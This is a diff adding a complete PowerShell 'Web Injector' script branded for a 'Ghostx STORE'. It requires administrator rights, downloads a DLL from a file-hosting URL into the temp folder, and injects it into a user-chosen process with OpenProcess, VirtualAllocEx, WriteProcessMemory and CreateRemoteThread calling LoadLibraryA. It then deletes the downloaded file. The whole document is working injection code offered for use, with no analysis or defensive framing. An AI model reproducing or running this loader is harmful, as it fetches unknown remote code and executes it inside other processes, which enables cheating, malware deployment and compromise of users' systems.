@@ -1,0 +1,87 @@
+# ==============================================================================
+# RADIANT - Ghostx STORE | Web Injector v2.0 (Silent & Stable)
+# ==============================================================================
+
+[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+Clear-Host
+
+# --- CHECK ADMIN ---
+$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
+if (-not $isAdmin) {
+    Write-Host " [!] Please run as Administrator!" -ForegroundColor Red
+    Pause; exit
+}
+
+# --- DEFINE API (SILENT MODE) ---
+if (-not ("Win32" -as [type])) {
+    $cSharpCode = @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class Win32 {
+        [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto)] public static extern IntPtr GetModuleHandle(string lpModuleName);
+        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
+        [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    }
+"@
+    Add-Type -TypeDefinition $cSharpCode -ErrorAction SilentlyContinue
+}
+
+# --- CONFIG ---
+$defaultUrl = "https://files.catbox.moe/1jcfgb.dll"
+$tempDllPath = "$env:TEMP\radiant_dxgi.dll"
+
+Write-Host "`n    RADIANT - Ghostx STORE | Web Injector" -ForegroundColor Cyan
+Write-Host "    ----------------------------------------"
+
+# --- INPUT PID ---
+$pidInput = Read-Host "`n    [?] Enter Process PID "
+if (-not (Get-Process -Id $pidInput -ErrorAction SilentlyContinue)) {
+    Write-Host "    [!] Invalid PID or Process not found!" -ForegroundColor Red
+    Pause; exit
+}
+
+# --- DOWNLOAD ---
+Write-Host "    [+] Downloading DLL..." -ForegroundColor Yellow
+try {
+    if (Test-Path $tempDllPath) { Remove-Item $tempDllPath -Force -ErrorAction SilentlyContinue }
+    Invoke-WebRequest -Uri $defaultUrl -OutFile $tempDllPath -TimeoutSec 10
+} catch {
+    Write-Host "    [!] Download Failed: $($_.Exception.Message)" -ForegroundColor Red
+    Pause; exit
+}
+
+# --- INJECTION ---
+Write-Host "    [+] Injecting into PID: $pidInput" -ForegroundColor Yellow
+try {
+    $fullDllPath = [System.IO.Path]::GetFullPath($tempDllPath)
+    $hProcess = [Win32]::OpenProcess(0x1F0FFF, $false, $pidInput)
+    
+    if ($hProcess -eq [IntPtr]::Zero) {
+        Write-Host "    [!] Failed to open process. Check AV/Admin." -ForegroundColor Red
+    } else {
+        $loadLibAddr = [Win32]::GetProcAddress([Win32]::GetModuleHandle("kernel32.dll"), "LoadLibraryA")
+        $allocMem = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$fullDllPath.Length, 0x3000, 0x40)
+        $bytes = [System.Text.Encoding]::ASCII.GetBytes($fullDllPath)
+        $out = [UIntPtr]::Zero
+        
+        [void][Win32]::WriteProcessMemory($hProcess, $allocMem, $bytes, [uint32]$bytes.Length, [ref]$out)
+        $hThread = [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibAddr, $allocMem, 0, [IntPtr]::Zero)
+
+        if ($hThread -ne [IntPtr]::Zero) {
+            Write-Host "    [SUCCESS] RADIANT DLL Injected!" -ForegroundColor Green
+        } else {
+            Write-Host "    [!] Injection thread failed." -ForegroundColor Red
+        }
+    }
+} catch {
+    Write-Host "    [!] Fatal Error: $($_.Exception.Message)" -ForegroundColor Red
+}
+
+# Cleanup
+if (Test-Path $tempDllPath) { Remove-Item $tempDllPath -Force -ErrorAction SilentlyContinue }
+
+Write-Host "`n    Press any key to exit..."
+[void][System.Console]::ReadKey($true)
